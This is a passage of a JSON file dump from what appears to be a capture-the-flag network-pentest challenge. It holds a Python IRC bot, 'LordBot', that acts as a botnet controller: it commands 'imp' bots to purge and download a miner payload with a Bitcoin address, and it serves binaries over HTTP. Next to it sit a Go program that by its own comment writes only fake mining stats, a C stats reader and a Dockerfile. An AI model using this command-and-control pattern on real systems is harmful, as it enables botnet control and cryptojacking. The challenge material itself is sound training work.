pubmsg_handler(self, conn, event):\n        if event.target == IMP_CHANNEL:\n            sender = parse_nick(event.source)\n            if sender not in self.imps:\n                return\n\n            msg = event.arguments[0]\n            if \"miner has died:\" in msg:\n                self.pause() \n                self.conn.privmsg(IMP_CHANNEL, f\"+{sender}, purge\")\n                self.pause() \n                self.conn.privmsg(IMP_CHANNEL, f\"+{sender}, payload {httproot}/miner {BTC_ADDR}\")\n\n    def all_events_handler(self, _, event):\n        if event.type not in (\"all_raw_messages\", \"motd\"):\n            logger.info(\"%s\", event)\n\n    def join_handler(self, conn, event):\n        new = parse_nick(event.source)\n        if event.target == IMP_CHANNEL:\n            # Greet the imps on join\n            if new == self.nick:\n                self.pause()\n                conn.privmsg(IMP_CHANNEL, \"greetings, imps\")\n            elif new.startswith('imp'):\n                self.register_imp(new)\n        elif event.target == SECRET_CHANNEL:\n            if  new != self.nick:\n                self.reward(conn, new)\n\n    def welcome_handler(self, conn, _):\n        # Elevate to oper and change nick to lord*\n        logger.info(\"executing oper with %s %s\", OPER_USERNAME, OPER_PASSWORD)\n        conn.oper(OPER_USERNAME, OPER_PASSWORD)\n        self.nick = \"lord\" + NICK\n        conn.nick(self.nick)\n\n        # Join the imp channel and the secret channel.\n        self.pause()\n        conn.join(IMP_CHANNEL)\n        self.pause()\n        conn.join(SECRET_CHANNEL)\n\n    def namreply_handler(self, conn, event):\n        _, channel, raw = event.arguments\n        names = [parse_nick(s) for s in raw.split()]\n        if channel == SECRET_CHANNEL:\n            for name in names:\n                if name != self.nick:\n                    self.reward(conn, name)\n                    break\n            else:\n                self.pause()\n                conn.privmsg(SECRET_CHANNEL, \"pretty lonely in here today...\")\n        elif channel == IMP_CHANNEL:\n            for name in names:\n                if name != self.nick and name.startswith('imp'):\n                    self.register_imp(name)\n\n    def quit_handler(self, _, event):\n        self.imps.discard(parse_nick(event.source))\n\ndef httpd():\n    bind = ('0.0.0.0', HTTPD_PORT)\n    logger.info(\"serving binaries from %s on %s\", httpbin, bind)\n    handler = functools.partial(http.server.SimpleHTTPRequestHandler, directory=httpbin)\n    http.server.HTTPServer(bind, handler).serve_forever()\n    \ndef main():\n    threading.Thread(target=httpd, daemon=True).start()\n\n    while True:\n        try:\n            LordBot((SERVER, 6667), nick=NICK, user=USERNAME, password=PASSWORD).run()\n        except (ConnectionError, irc.client.ServerConnectionError, OSError):\n            logger.exception(\"error while running LordBot\")\n            time.sleep(10)\n        except KeyboardInterrupt:\n            logger.info(\"shutting down: recieved SIGINT\")\n            break\n\nif __name__ == \"__main__\":\n    main()\n",
    "lord\\requirements.txt": "irc==17.0\n",
    "lord\\stats.c": "#include <stdio.h>\n\nstatic const char STATS_PATH[] = \"/var/run/stats\";\n\nint main() {\n    int num;\n    FILE *fptr;\n    char str[1024];\n\n    if ((fptr = fopen(STATS_PATH,\"r\")) == NULL){\n       printf(\"error opening %s\\n\", STATS_PATH);\n       return 1;\n    }\n\n    if (fgets(str, 1024, fptr) != NULL) {\n        puts(str);\n    } else {\n        printf(\"no stats\\n\");\n        return 1;\n    }\n    fclose(fptr);\n    return 0;\n}\n",
    "lord\\bin\\miner": "[Binary file or unsupported type: c:\\users\\jomue\\tamuctf-2019-master\\tamuctf-2019-master\\networkpentest\\altf4\\lord\\bin\\miner]",
    "lord\\bin\\stats": "[Binary file or unsupported type: c:\\users\\jomue\\tamuctf-2019-master\\tamuctf-2019-master\\networkpentest\\altf4\\lord\\bin\\stats]",
    "lord\\miner\\miner.go": "package main\n\nimport (\n\t\"fmt\"\n\t\"math/rand\"\n\t\"os\"\n\t\"regexp\"\n\t\"syscall\"\n\t\"time\"\n)\n\nconst (\n\tPipePath    = \"/var/run/stats\"\n\tInterval    = 100 * time.Millisecond\n\tMu          = 18.0\n\tSigma       = 1.5\n\tFailureRate = 0.025\n\n\tNoteToReverseEngineers = `Are you reverse engineering this right now?  I\nappreciate your dedication, but the flag ain't here... just some mediocore Go\ncode that writes fake mining stats to a FIFO. I probably shouldn't have even\nbothered writing it, but the fact that you are reading this write now makes me\nfeel that it was worth it.`\n)\n\nvar (\n\tbirth = time.Now()\n)\n\nfunc Stats(wallet string) []byte {\n\tuptime := time.Since(birth).Seconds()\n\trate := rand.NormFloat64()*Sigma + Mu\n\treturn []byte(fmt.Sprintf(\"dst %s\\nuptime %.f s\\n%.2f Mhash/s\\n0 blocks mined\\n\", wallet, uptime, rate))\n}\n\nfunc WriteStats(path, wallet string) error {\n\tpipe, err := os.OpenFile(path, os.O_WRONLY, 0600)\n\tif err != nil {\n\t\treturn fmt.Errorf(\"failed to open pipe for write: %v\", err)\n\t}\n\tdefer pipe.Close()\n\tif rand.Float64() < FailureRate {\n\t\treturn fmt.Errorf(\"miner has died: SIGSEGV\")\n\t} else if _, err := pipe.Write(Stats(wallet)); err != nil {\n\t\treturn fmt.Errorf(\"failed to write to pipe: %v\", err)\n\t}\n\treturn nil\n}\n\nfunc OpenPipe(path string) error {\n\tif stat, err := os.Stat(path); err != nil {\n\t\tif os.IsNotExist(err) {\n\t\t\tif err := syscall.Mkfifo(path, 0600); err != nil {\n\t\t\t\treturn fmt.Errorf(\"failed to open pipe at %s: %v\", path, err)\n\t\t\t}\n\t\t\treturn nil\n\t\t}\n\t\treturn fmt.Errorf(\"failed to stat pipe at %s: %v\", path, err)\n\t} else if stat.Mode()&os.ModeNamedPipe == 0 {\n\t\treturn fmt.Errorf(\"file at %s is not a pipe\", path)\n\t}\n\treturn nil\n}\n\nfunc main() {\n\twallet := os.Args[1]\n\tmatch, err := regexp.MatchString(`^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$`, wallet)\n\tif err != nil {\n\t\tfmt.Print(err)\n\t\tos.Exit(1)\n\t}\n\tif !match {\n\t\tfmt.Printf(\"%s is not a valid address\", wallet)\n\t\tos.Exit(1)\n\t}\n\n\tif err := OpenPipe(PipePath); err != nil {\n\t\tfmt.Print(err)\n\t\tos.Exit(1)\n\t}\n\tfor {\n\t\tif err := WriteStats(PipePath, wallet); err != nil {\n\t\t\tfmt.Print(err)\n\t\t\tos.Exit(1)\n\t\t}\n\t\ttime.Sleep(Interval)\n\t}\n}\n\nfunc init() {\n\trand.Seed(time.Now().UnixNano())\n}\n",
    "router\\Dockerfile": "FROM alpine\nUSER nobody\n# CMD which will run forever.\nCMD [\"tail\", \"-f\", \"/dev/null\"]\n",
    "category": "NetworkPentest"
}